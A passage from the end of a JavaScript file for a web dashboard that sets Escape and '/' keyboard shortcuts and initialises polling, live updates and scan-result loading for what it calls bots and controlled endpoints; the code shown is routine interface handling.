}

// Global Keyboard Shortcuts (Point 3.2: ESC & / key ergonomics)
document.addEventListener('keydown', function (e) {
  if (e.key === 'Escape') {
    closeModal();
    var ctx = document.getElementById('bot-ctx-menu');
    if (ctx) ctx.style.display = 'none';
  } else if (e.key === '/' && document.activeElement && ['INPUT', 'TEXTAREA', 'SELECT'].indexOf(document.activeElement.tagName) === -1) {
    e.preventDefault();
    var search = document.getElementById('bot-search');
    if (search) {
      switchSection('bots');
      search.focus();
      showToast('已聚焦受控端全局搜索框', 'info');
    }
  }
});

// Initialize application
document.addEventListener('DOMContentLoaded', function () {
  updateArgFields();
  startPolling();
  refreshAll();
  initSSE();
  initCRT();
  loadScanResults();
});

